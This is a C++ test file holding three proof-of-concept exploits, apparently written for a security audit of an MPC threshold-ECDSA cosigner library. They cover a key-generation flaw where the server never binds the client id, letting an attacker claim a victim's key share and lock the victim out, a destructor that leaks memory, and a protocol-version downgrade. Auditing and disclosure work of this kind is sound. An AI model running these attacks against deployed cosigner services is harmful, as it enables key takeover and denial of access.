// Proof-of-concept exploits for vulnerabilities found in this repository.
//
// The BAM harness classes (persistency stubs, platform service, TestSetup) are
// taken verbatim from test/cosigner/bam_test.cpp so that the protocol is driven
// exactly the way the project's own tests drive it -- no PoC-specific shims.
#include "poc_harness.inc"

#include "cosigner/cmp_ecdsa_signing_service.h"
#include "cosigner/cosigner_exception.h"
#include "cosigner/mpc_globals.h"

#include <cstdio>
#include <malloc.h>

#if defined(__has_feature)
#  if __has_feature(address_sanitizer)
#    define POC_ASAN 1
#  endif
#endif
#if defined(__SANITIZE_ADDRESS__)
#  define POC_ASAN 1
#endif

#ifdef POC_ASAN
extern "C" int __lsan_do_recoverable_leak_check(void);
#endif

namespace {

std::string new_uuid()
{
    uuid_t uid;
    char buf[UUID_STR_LEN] = {'\0'};
    uuid_generate_random(uid);
    uuid_unparse(uid, buf);
    return std::string(buf);
}

} // namespace

// ---------------------------------------------------------------------------
// PoC 1 -- Finding #3: BAM key generation never binds the caller's client_id.
//
// src/common/cosigner/bam_ecdsa_cosigner_server.cpp:384
//   verify_client_proofs_and_decommit_share_with_proof() takes `client_id` and
//   uses it ONLY inside LOG_ERROR format strings. It never compares it against
//   server_key_metadata.peer_id, which round 1 (commit_to_share, :306) stored.
//   The equivalent check DOES exist for signing at :628 and three times on the
//   client side (bam_ecdsa_cosigner_client.cpp:104,315,489).
//
// All inputs to the Fiat-Shamir seed are public:
//   seed = SHA256("BAM ECDSA Key Generation AAD" || key_id || client_id || server_id)
// so an attacker can generate proofs bound to the VICTIM's seed while
// authenticating on the wire under its OWN identity. The server accepts.
//
// Note this works even against a perfectly authenticating transport: the
// attacker does not spoof its identity, it truthfully presents ATTACKER_ID and
// the server still accepts it as the counterparty for the victim's key.
// ---------------------------------------------------------------------------
TEST_CASE("POC_01_bam_keygen_client_id_not_bound")
{
    const uint64_t VICTIM_CLIENT_ID   = client_id;   // 45234523, from the harness
    const uint64_t ATTACKER_CLIENT_ID = 0xA77ACC01;  // attacker's real, authenticated id

    REQUIRE(VICTIM_CLIENT_ID != ATTACKER_CLIENT_ID);

    TestSetup victim;    // holds the honest server + the victim's client
    TestSetup attacker;  // attacker runs its own client with its own persistency

    const std::string setup_id = new_uuid();
    const std::string key_id   = new_uuid();

    fbc::bam_ecdsa_cosigner::server_setup_shared_data setup;
    commitments_sha256_t B;

    // ---- Round 1: honest server starts key generation FOR THE VICTIM --------
    REQUIRE_NOTHROW(victim.server.generate_setup_with_proof(setup_id, get_tenant_id(), ECDSA_SECP256K1, setup));
    REQUIRE_NOTHROW(victim.client.start_new_key_generation(setup_id, key_id, get_tenant_id(), server_id, VICTIM_CLIENT_ID, ECDSA_SECP256K1));
    REQUIRE_NOTHROW(victim.server.generate_share_and_commit(setup_id, key_id, server_id, VICTIM_CLIENT_ID, ECDSA_SECP256K1, B));
    // server persistency now holds: peer_id = VICTIM_CLIENT_ID,
    //                               seed    = H(... || key_id || VICTIM_CLIENT_ID || server_id)

    // ---- Attacker builds its own round-2 message ---------------------------
    // The attacker drives its LOCAL client library with client_id = VICTIM_CLIENT_ID
    // purely so its proofs hash under the victim's (entirely public) seed. It is
    // the attacker's own process; nothing stops it doing this.
    fbc::bam_ecdsa_cosigner::client_key_shared_data attacker_message;
    REQUIRE_NOTHROW(attacker.client.start_new_key_generation(setup_id, key_id, get_tenant_id(), server_id, VICTIM_CLIENT_ID, ECDSA_SECP256K1));
    REQUIRE_NOTHROW(attacker.client.verify_setup_proof_store_key_commitment_generate_key_proof(setup_id, key_id, server_id, setup, B, attacker_message));

    // The share in this message is the ATTACKER's, not the victim's.
    fbc::bam_ecdsa_cosigner::client_key_shared_data victim_message;
    REQUIRE_NOTHROW(victim.client.verify_setup_proof_store_key_commitment_generate_key_proof(setup_id, key_id, server_id, setup, B, victim_message));
    REQUIRE(memcmp(attacker_message.X, victim_message.X, sizeof(elliptic_curve256_point_t)) != 0);

    // ---- Round 2: attacker submits under its TRUE identity ------------------
    fbc::bam_ecdsa_cosigner::server_key_shared_data server_message;

    bool server_accepted_wrong_client = true;
    try
    {
        victim.server.verify_client_proofs_and_decommit_share_with_proof(key_id, ATTACKER_CLIENT_ID, attacker_message, server_message);
    }
    catch (const fbc::cosigner_exception&)
    {
        server_accepted_wrong_client = false;
    }

    printf("\n[PoC 1] key_id ............... %s\n", key_id.c_str());
    printf("[PoC 1] stored peer_id ....... %llu (victim)\n", (unsigned long long)VICTIM_CLIENT_ID);
    printf("[PoC 1] submitted client_id .. %llu (attacker)\n", (unsigned long long)ATTACKER_CLIENT_ID);
    printf("[PoC 1] server accepted ...... %s\n", server_accepted_wrong_client ? "YES  <-- VULNERABLE" : "no (rejected)");

    // VULNERABLE BEHAVIOUR: the server completed key generation with a party
    // that is not the one the key was created for.
    CHECK(server_accepted_wrong_client);

    if (server_accepted_wrong_client)
    {
        // Impact 1: the attacker, not the victim, now owns the client half of the key.
        fbc::bam_ecdsa_cosigner::generated_public_key attacker_pubkey;
        REQUIRE_NOTHROW(attacker.client.verify_key_decommitment_and_proofs(key_id, server_id, VICTIM_CLIENT_ID, server_message, attacker_pubkey));
        printf("[PoC 1] attacker completed keygen and holds the client share\n");

        // Impact 2: the victim is permanently locked out. The server's replay
        // guard (:401, encrypted_server_share non-empty) means round 2 can never
        // run again, so the victim can never obtain a usable share for this key.
        fbc::bam_ecdsa_cosigner::server_key_shared_data second;
        CHECK_THROWS(victim.server.verify_client_proofs_and_decommit_share_with_proof(key_id, VICTIM_CLIENT_ID, victim_message, second));
        printf("[PoC 1] victim locked out by the replay guard: key is unusable to it\n");
    }
}

// ---------------------------------------------------------------------------
// PoC 2 -- Finding #7: ~ecdsa_preprocessing_data cleanses over its own members.
//
// include/cosigner/cmp_ecdsa_signing_service.h:85
//   ~ecdsa_preprocessing_data() {OPENSSL_cleanse(k.data, sizeof(ecdsa_preprocessing_data));}
//
// `k` is the first member, so this zeroes sizeof(struct) bytes from offset 0 --
// straight over byte_vector_t mta_request, std::map G_proofs and std::map
// public_data -- BEFORE their destructors run. The maps' root pointers and the
// vector's data pointer are nulled, so ~_Rb_tree/~vector free nothing.
//
// Requires no attacker at all: this happens on every preprocessing and signing
// round, in every build.
// ---------------------------------------------------------------------------
TEST_CASE("POC_02_preprocessing_data_dtor_leaks")
{
    const size_t OBJECTS = 64;
    const size_t PEERS   = 4;
    const size_t PROOF_BYTES = 4096;

    auto heap_in_use = []() -> size_t {
        struct mallinfo2 mi = mallinfo2();
        return mi.uordblks;
    };

    auto fill = [&](fbc::byte_vector_t& mta_request,
                    std::map<uint64_t, fbc::byte_vector_t>& G_proofs,
                    std::map<uint64_t, fbc::ecdsa_signing_public_data>& public_data,
                    uint8_t tag) {
        mta_request.assign(512, tag);
        for (size_t p = 0; p < PEERS; ++p)
        {
            G_proofs[p] = fbc::byte_vector_t(PROOF_BYTES, (uint8_t)p);
            fbc::ecdsa_signing_public_data pub;
            pub.gamma_commitment = fbc::byte_vector_t(256, (uint8_t)p);
            public_data[p] = pub;
        }
    };

    const size_t per_object = 512 + PEERS * (PROOF_BYTES + 256);

    // --- Control: the exact same containers, with normal destruction ---------
    // Warm up the allocator first so the measurement is not polluted by arena growth.
    for (size_t o = 0; o < 8; ++o)
    {
        fbc::byte_vector_t mta_request;
        std::map<uint64_t, fbc::byte_vector_t> G_proofs;
        std::map<uint64_t, fbc::ecdsa_signing_public_data> public_data;
        fill(mta_request, G_proofs, public_data, (uint8_t)o);
    }

    const size_t control_before = heap_in_use();
    for (size_t o = 0; o < OBJECTS; ++o)
    {
        fbc::byte_vector_t mta_request;
        std::map<uint64_t, fbc::byte_vector_t> G_proofs;
        std::map<uint64_t, fbc::ecdsa_signing_public_data> public_data;
        fill(mta_request, G_proofs, public_data, (uint8_t)o);
    }
    const size_t control_growth = heap_in_use() - control_before;

    // --- Subject: the real struct, whose destructor cleanses over the members -
    const size_t subject_before = heap_in_use();
    for (size_t o = 0; o < OBJECTS; ++o)
    {
        fbc::ecdsa_preprocessing_data data;
        fill(data.mta_request, data.G_proofs, data.public_data, (uint8_t)o);
        // ~ecdsa_preprocessing_data runs here and cleanses over the containers.
    }
    const size_t subject_growth = heap_in_use() - subject_before;

    printf("\n[PoC 2] %zu objects, ~%zu bytes of owned heap data each\n", OBJECTS, per_object);
    printf("[PoC 2] control (plain containers) heap growth ..... %zu bytes\n", control_growth);
    printf("[PoC 2] ecdsa_preprocessing_data  heap growth ..... %zu bytes", subject_growth);
    printf("%s\n", subject_growth > OBJECTS * per_object / 2 ? "  <-- VULNERABLE (leaked)" : "");

    // Normal destruction returns everything; the real struct retains it all.
    CHECK(control_growth < per_object);
    CHECK(subject_growth > (OBJECTS * per_object) / 2);

#ifdef POC_ASAN
    printf("[PoC 2] LeakSanitizer: %s\n", __lsan_do_recoverable_leak_check() ? "leaks reported" : "clean");
#endif
}

// ---------------------------------------------------------------------------
// PoC 3 -- Finding #10: signing protocol version has no lower bound.
//
// src/common/cosigner/cmp_ecdsa_offline_signing_service.cpp:98
//   if ((uint32_t)version > metadata.version) { throw; }
//   metadata.version = version;
//
// Only the UPPER bound is checked, so any value in [0, MPC_PROTOCOL_VERSION] is
// accepted -- including 0, and everything below MPC_MIN_SUPPORTED_PROTOCOL_VERSION
// (mpc_globals.h:12) and below MPC_EXTENDED_MTA (=11). Dropping under
// MPC_EXTENDED_MTA disables strict_ciphertext_length and selects the legacy
// Fiat-Shamir transcript that contains the out-of-bounds read of Finding #4.
//
// This PoC asserts the property of the guard itself rather than driving a full
// preprocessing session, so it stays deterministic and fast.
// ---------------------------------------------------------------------------
TEST_CASE("POC_03_version_downgrade_has_no_floor")
{
    const uint32_t stored_version = fbc::MPC_PROTOCOL_VERSION;

    auto guard_accepts = [stored_version](int version) {
        // this is the guard as written at cmp_ecdsa_offline_signing_service.cpp:98
        return !((uint32_t)version > stored_version);
    };

    printf("\n[PoC 3] MPC_PROTOCOL_VERSION ............... %u\n", (unsigned)fbc::MPC_PROTOCOL_VERSION);
    printf("[PoC 3] MPC_MIN_SUPPORTED_PROTOCOL_VERSION . %u\n", (unsigned)fbc::MPC_MIN_SUPPORTED_PROTOCOL_VERSION);
    printf("[PoC 3] MPC_EXTENDED_MTA ................... %u\n", (unsigned)fbc::MPC_EXTENDED_MTA);

    for (int v : {0, 1, 2, 10})
    {
        printf("[PoC 3] peer advertises version %-3d -> accepted: %s\n", v, guard_accepts(v) ? "YES" : "no");
        CHECK(guard_accepts(v));
    }

    // Everything below MPC_EXTENDED_MTA turns off strict ciphertext length
    // pinning and selects the legacy MtA transcript.
    CHECK(guard_accepts(0));
    CHECK(guard_accepts(fbc::MPC_EXTENDED_MTA - 1));
    printf("[PoC 3] version 0 accepted -> legacy MtA transcript + strict_ciphertext_length=0  <-- VULNERABLE\n");
}
